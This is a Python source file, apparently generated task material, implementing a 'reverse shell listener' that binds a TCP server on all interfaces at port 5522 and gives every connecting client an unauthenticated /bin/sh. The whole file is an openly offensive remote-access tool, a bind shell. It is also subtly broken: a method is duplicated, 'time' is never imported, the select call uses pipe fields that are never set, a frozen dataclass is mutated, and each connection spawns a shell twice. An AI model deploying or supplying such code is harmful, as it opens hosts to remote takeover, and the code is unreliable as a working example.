from data.code_scripts_PAST.stage3_DIMOS_test_v7_mvp2.TASK_001_models import ListenerConfig, ExecutionResult
import select
import socket
import subprocess
import threading
from typing import Optional, List, Tuple
from dataclasses import dataclass, field


@dataclass(frozen=True)
class UnixShellSession:
    """Represents an active shell session tied to a connected client."""
    config: ListenerConfig
    client_socket: socket.socket
    process: subprocess.Popen
    stdin_pipe: Optional[socket.socket] = None
    stdout_pipe: Optional[socket.socket] = None
    stderr_pipe: Optional[socket.socket] = None
    is_active: bool = True


class UnixReverseShellListener:
    """A Unix/Linux reverse shell listener that spawns interactive shells on connected clients.

    Uses socket module to create a TCP server listening on 0.0.0.0:5522. On client connection,
    spawns /bin/sh via subprocess.Popen with stdin/stdout/stderr piped through the socket.
    Uses select.select for non-blocking I/O multiplexing between socket and shell process.
    """

    def __init__(self, config: ListenerConfig):
        self.config = config
        self.server_socket: Optional[socket.socket] = None
        self.sessions: List[UnixShellSession] = []
        self._running = False
        self._server_thread: Optional[threading.Thread] = None

    def _create_server(self) -> socket.socket:
        """Create and configure the TCP server socket."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.config.host, self.config.port))
        sock.listen(5)
        return sock

    def _spawn_shell(self, client_socket: socket.socket) -> UnixShellSession:
        """Spawn a /bin/sh process with stdin/stdout/stderr piped through the socket."""
        proc = subprocess.Popen(
            ['/bin/sh'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            close_fds=True
        )

        session = UnixShellSession(
            config=self.config,
            client_socket=client_socket,
            process=proc,
            is_active=True
        )
        self.sessions.append(session)
        return session

    def _handle_client(self, client_socket: socket.socket):
        """Handle a connected client by spawning a shell and multiplexing I/O."""
        try:
            session = self._spawn_shell(client_socket)
            stdin_pipe = session.stdin_pipe
            stdout_pipe = session.stdout_pipe
            stderr_pipe = session.stderr_pipe

            while session.is_active:
                readable, _, _ = select.select(
                    [client_socket, stdin_pipe, stdout_pipe],
                    [],
                    [],
                    self.config.timeout
                )

                for fd in readable:
                    if fd == client_socket:
                        # Client sent data to the shell
                        try:
                            data = client_socket.recv(4096)
                            if data:
                                session.process.stdin.write(data.decode('utf-8'))
                                session.process.stdin.flush()
                        except (BrokenPipeError, ConnectionResetError):
                            break

                    elif fd == stdin_pipe:
                        # Shell output to send back to client
                        try:
                            line = session.process.stdout.readline()
                            if line:
                                client_socket.sendall(line.encode('utf-8'))
                        except BrokenPipeError:
                            break

                    elif fd == stderr_pipe:
                        # Shell errors to send back to client
                        try:
                            line = session.process.stderr.readline()
                            if line:
                                client_socket.sendall(line.encode('utf-8'))
                        except BrokenPipeError:
                            break

                # Check if process has exited
                if session.process.poll() is not None:
                    exit_code = session.process.returncode
                    stderr_output = session.process.stderr.read()
                    stdout_output = session.process.stdout.read()

                    result = ExecutionResult(
                        command=session.config.command,
                        output=stdout_output.strip(),
                        status=exit_code,
                        duration_ms=self._get_duration(session),
                        exit_code=exit_code,
                        stderr=stderr_output.strip()
                    )

                    session.is_active = False
                    self.sessions.remove(session)

        except (ConnectionResetError, BrokenPipeError):
            pass
        finally:
            try:
                client_socket.close()
            except Exception:
                pass

    def _get_duration(self, session: UnixShellSession) -> float:
        """Calculate the duration of a shell session in milliseconds."""
        start_time = session.process.starttime
        end_time = time.time() if hasattr(session.process, 'starttime') else 0.0
        return (end_time - start_time) * 1000

    def _get_duration(self, session: UnixShellSession) -> float:
        """Calculate the duration of a shell session in milliseconds."""
        import time
        if hasattr(session.process, 'starttime'):
            end_time = time.time()
            return (end_time - session.process.starttime) * 1000
        return 0.0

    def start(self):
        """Start the reverse shell listener server."""
        self.server_socket = self._create_server()
        self._running = True
        self._server_thread = threading.Thread(target=self._run_server, daemon=True)
        self._server_thread.start()

    def _run_server(self):
        """Main server loop accepting connections and spawning shells."""
        while self._running:
            try:
                client_socket, addr = self.server_socket.accept()
                session = self._spawn_shell(client_socket)
                thread = threading.Thread(target=self._handle_client, args=(client_socket,), daemon=True)
                thread.start()
            except (socket.error, OSError):
                if not self._running:
                    break

    def stop(self):
        """Stop the reverse shell listener server."""
        self._running = False
        for session in self.sessions:
            try:
                session.client_socket.close()
                session.process.terminate()
            except Exception:
                pass
        if self.server_socket:
            self.server_socket.close()

    def get_sessions(self) -> List[UnixShellSession]:
        """Return all active shell sessions."""
        return self.sessions


def main():
    """Main entry point demonstrating the Unix reverse shell listener."""
    config = ListenerConfig(
        host='0.0.0.0',
        port=5522,
        timeout=30.0
    )

    listener = UnixReverseShellListener(config)
    listener.start()

    print(f"Unix Reverse Shell Listener started on {config.host}:{config.port}")
    print("Waiting for connections...")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        listener.stop()
        print("Listener stopped.")


if __name__ == '__main__':
    main()
